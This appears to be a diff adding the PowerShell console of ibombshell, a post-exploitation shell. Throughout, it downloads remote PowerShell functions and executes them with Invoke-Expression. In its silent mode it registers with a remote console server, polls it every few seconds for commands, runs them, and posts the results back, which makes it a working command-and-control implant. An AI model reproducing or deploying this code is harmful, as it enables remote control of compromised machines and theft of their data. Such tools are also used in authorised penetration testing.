@@ -1,0 +1,164 @@
+
+
+function console{
+ 
+    param(
+        [Switch] $Silently,
+        [String] $uriConsole,
+        [String] $id
+    )
+
+    function loader{
+        param(
+            [Parameter(Mandatory)]
+            [string] $command,
+            [Parameter(Mandatory)]
+            [string] $RawBase,
+            [Parameter(Mandatory)]
+            [string] $RawFunctions
+        )
+
+        $RawURL = $RawBase + $RawFunctions + $command
+        return (iwr -UseBasicParsing -Headers @{"Cache-Control"="no-cache"}  -uri $RawURL).Content
+
+    }
+
+    $banner = "
+      ,--.!,    _ ____                  __   _____ __         ____
+   __/   -*-   (_) __ )____  ____ ___  / /_ / ___// /_  ___  / / /
+ ,d08b.  '|``  / / __  / __ \/ __ ``__ \/ __ \\__ \/ __ \/ _ \/ / /
+ 0088MM      / / /_/ / /_/ / / / / / / /_/ /__/ / / / /  __/ / /
+ ``9MMP'     /_/_____/\____/_/ /_/ /_/_.___/____/_/ /_/\___/_/_/"
+
+    
+    #Important: URL download ibombshell
+    $gtRawBase = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/"
+    $gtRawFunctions = "data/functions/"
+    $functionsList = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/functions.txt"
+    [System.Collections.ArrayList]$global:functionsLoaded = "showcommands" , "showfunctions" , "quit"
+    #Condition for exit
+    $global:condition = $true
+
+
+
+    if($Silently)
+    {
+        loader -command "generateid" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        if(-not($id))
+        {
+            $id = generateid
+        }
+
+        #i am new warrior
+        if($uriConsole.Length -ne 0)
+        {
+            $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id"
+        }
+    }
+    else{
+        #getting function's list
+        $list = (new-object net.webclient).downloadstring($functionsList)
+        loader -command "system/detect-OS" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        if(detect-OS == "windows")
+        {
+            $delimet = "`r`n"
+        }
+        else
+        {
+            $delimet = "`n"
+        }
+        $global:commandList = $list.split($delimet)
+        #loader functions default
+        loader -command "showfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "showcommands" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "addcommand" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "commandsearch" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "quit" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "saveandloadfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "version" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "print/printprompt" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "print/messagedata" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        addcommand -command "savefunctions"
+        addcommand -command "deletefunctionsreg"
+        addcommand -command "version"
+        readfunctions | iex
+        clear-host
+        write-host -ForegroundColor Yellow $banner
+        write-host 
+    }
+
+    while($global:condition)
+    {
+
+        if($Silently)
+        {
+            
+            if($uriConsole.Length -ne 0)
+            {
+                $content = (iwr -UseBasicParsing -Uri "$uriConsole/ibombshell/$id").content 
+                if($content.length -gt 0)
+                {
+                    $results = $content | iex
+
+                    #Send results
+                    if ($results.GetType().Name -eq "String")
+                    {
+                        iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$results}
+                    }
+                    else
+                    {
+                        $send = ""
+                        foreach($i in $results)
+                        {
+                            $send = $send + $i + '\n'
+                        }
+                        iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$send}
+                    }
+
+                }
+                sleep 5
+            }
+            else
+            {
+                sleep 5
+            }
+            
+        }
+        else
+        {
+            printprompt
+            $command = Read-Host  
+
+            if(($command.Length -eq 0)-or($command.StartsWith(" ")))
+            {
+                continue
+            }      
+            if ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded)-and($command.Split(" ")[0].Equals("loaderext")))
+            {
+                $command | iex | iex
+            }
+            elseif (commandsearch -command $command.split(" ")[0] -list $functionsLoaded)
+            {
+                #$command
+                $command | iex
+            }
+            elseif (commandsearch -command $command -list $commandList)
+            {
+                #loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions
+                loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                printMessage -message "Function Loaded"
+                addcommand -command $command 
+            }
+            else
+            {
+                printMessage -message "Stupid Command!"
+            }
+
+        }
+
+    }
+
+}
+
+
+
